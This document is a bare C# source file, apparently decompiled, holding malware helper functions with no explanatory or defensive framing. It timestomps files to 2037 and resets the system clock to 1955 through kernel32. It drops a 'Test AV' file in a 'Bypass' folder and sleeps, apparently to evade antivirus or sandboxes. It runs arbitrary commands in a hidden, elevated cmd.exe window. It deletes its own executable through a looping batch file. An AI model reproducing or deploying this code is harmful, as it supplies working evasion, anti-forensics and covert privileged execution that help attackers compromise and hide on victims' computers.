using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace TRIPLE;

internal class func
{
	public struct SystemTime
	{
		public ushort Year;

		public ushort Month;

		public ushort DayOfWeek;

		public ushort Day;

		public ushort Hour;

		public ushort Minute;

		public ushort Second;

		public ushort Millisecond;
	}

	public static void setdatenew(string filename)
	{
		DateTime dateTime = new DateTime(2037, 1, 1, 0, 0, 0);
		File.SetCreationTime(filename, dateTime);
		File.SetLastAccessTime(filename, dateTime);
		File.SetLastWriteTime(filename, dateTime);
	}

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern void GetSystemTime(ref SystemTime sysTime);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern bool SetSystemTime(ref SystemTime sysTime);

	public static void SetSystemDateEMMM()
	{
		SystemTime sysTime = default(SystemTime);
		sysTime.Year = 1955;
		sysTime.Month = 3;
		sysTime.Day = 16;
		sysTime.Hour = 10;
		sysTime.Minute = 0;
		sysTime.Second = 0;
		SetSystemTime(ref sysTime);
	}

	public static bool simulate_os()
	{
		string tempPath = Path.GetTempPath();
		string path = Path.Combine(tempPath, "Bypass\\changelog.txt");
		_ = DateTime.UtcNow.Date;
		using (StreamWriter streamWriter = new StreamWriter(path))
		{
			streamWriter.Write("Test AV");
		}
		Thread.Sleep(30000);
		return true;
	}

	public static void getlow(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.Verb = "runas";
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = commands;
		process.StartInfo = processStartInfo;
		process.Start();
	}

	public static void _self_delete()
	{
		string executablePath = Application.get_ExecutablePath();
		string fileName = Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName);
		string[] array = new string[4]
		{
			":Repeat",
			"del \"" + fileName + "\"",
			"if exist \"" + fileName + "\" goto Repeat",
			"del ecorp.bat"
		};
		array[1] = "del \"" + executablePath.Split(new char[1] { '\\' })[executablePath.Split(new char[1] { '\\' }).Length - 1] + "\"";
		array[2] = "if exist \"" + executablePath.Split(new char[1] { '\\' })[executablePath.Split(new char[1] { '\\' }).Length - 1] + "\" goto Repeat";
		FileInfo fileInfo = new FileInfo(Application.get_StartupPath() + "\\ecorp.bat");
		StreamWriter streamWriter = fileInfo.CreateText();
		for (int i = 0; i < array.Length; i++)
		{
			streamWriter.WriteLine(array[i]);
		}
		streamWriter.Close();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = Application.get_StartupPath() + "\\ecorp.bat";
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		Process.Start(processStartInfo);
	}
}
